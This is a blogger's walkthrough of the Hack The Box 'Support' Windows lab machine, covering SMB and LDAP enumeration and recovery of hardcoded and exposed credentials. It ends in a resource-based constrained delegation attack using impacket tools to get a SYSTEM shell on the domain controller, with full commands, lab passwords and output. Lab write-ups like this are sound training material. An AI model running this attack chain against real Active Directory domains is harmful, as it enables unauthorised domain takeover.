---
title: HackTheBox - Support
date: 2022-12-04
author: Marius
tags: [ctf, 'Hack The Box', 'htb', 'windows']
---

Easy rated and most importantly free Windows box found in Hack The Box. Lets give it a shot!

### Enumeration

Looks like I will be working with AD environment based on DNS, Kerberos and LDAP ports.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 09:28 EST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.10s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-04 14:29:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-12-04T14:29:09
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.17 seconds

```

### SMB

Spun up Crackmapexec to list open shares with guest user. Looks liked there's a non-standard share "support staff tools"

```
└─$ cme smb 10.10.11.174 -u "guest" -p "" --shares         
 
[*] completed: 100.00% (1/1)
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [+] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 
```

SMB Share contains well-known support tools except for **UserInfo.exe.zip** which seems to be an odd one out.

```
└─$ smbclient //10.10.11.174/support-tools
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
  
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (242.2 KiloBytes/sec) (average 242.2 KiloBytes/sec)

```

Downloaded and unziped the archive. **UserInfo.exe** looks to be something that can be inspected further.

![alt text](/assets/img/support/1.png)

**Strings** and **cat** does not reveal that much sense out of this executable. I have decided to transfer it to my Windows VM and inspect it with [dnSpy debugger](https://github.com/dnSpy/dnSpy). By inspecting functions I've observed function called **getPassword()** which uses a hardcoded password for LDAP queries. Unfortunately password is encoded.

![alt text](/assets/img/support/2.png)

Setting a breakpoint before password is used in the program I managed to collect plaintext password alongside with username that can be observed in LdapQuery function.

![alt text](/assets/img/support/3.png)

I have verified that password is working using CME.
```
─$ cme smb 10.10.11.174 -u "ldap" -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

### Exploitation

With credentials that I have collected, I have enumerated LDAP and collected info for Bloodhound.

LDAP search revealed a password for **support** user found in **info** property.

```
└─$ ldapsearch -x -H ldap://10.10.11.174 -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "Cn=Users,DC=support,DC=htb" > ldap_users.txt 
```

![alt text](/assets/img/support/4.png)

```
└─$ python bloodhound.py -ns 10.10.11.174 -d support.htb -c all -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
INFO: Found AD domain: support.htb
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WALULA.support.htb
INFO: Querying computer: 
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
WARNING: Could not resolve: WALULA.support.htb: The resolution lifetime expired after 3.204 seconds: Server 10.10.11.174 UDP port 53 answered The DNS operation timed out.; Server 10.10.11.174 UDP port 53 answered The DNS operation timed out.
INFO: Done in 00M 27S
```
Reviewing results in Bloodhound I have observed that support user ,who's credentials I found in LDAP, is member of "**Shared Support Accounts"** who has **GenericAll** (Resource Based Contrained Delegatiot) privileges over DC which can be used to escalate privileges.

![alt text](/assets/img/support/5.png)

### Privilege Escalation

First I created fake computer using impacket.

```
└─$ impacket-addcomputer support.htb/support:Ironside47pleasure40Watchful -dc-ip 10.10.11.174 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
```

Then I have used [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) to modify delegation rights.

```
└─$ python rbcd.py -dc-ip 10.10.11.174 -t dc -f 'ATTACK' support.htb\\support:Ironside47pleasure40Watchful
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against dc$
[*] Initializing LDAP connection to 10.10.11.174
[*] Using support.htb\support account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `dc`
[*] Delegation rights modified successfully!
[*] ATTACK$ can now impersonate users on dc$ via S4U2Proxy
```

Next I used **impacket-getST** to get service ticket.

```
└─$ impacket-getST -spn cifs/dc.support.htb support.htb/attack\$:'AttackerPC1!' -impersonate administrator -dc-ip 10.10.11.174   
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

Export ticket as environment variable.

```
└─$ export KRB5CCNAME=./Administrator.ccache
```

Finally used impacket psexec with -no-pass arg to psexec to DC. 

```
└─$ impacket-psexec -k -no-pass dc.support.htb -dc-ip 10.10.11.174          
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file xMbicevQ.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service YuDO on dc.support.htb.....
[*] Starting service YuDO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

And I am root ! Spend some time on this machine, I would rate this as medium and not easy.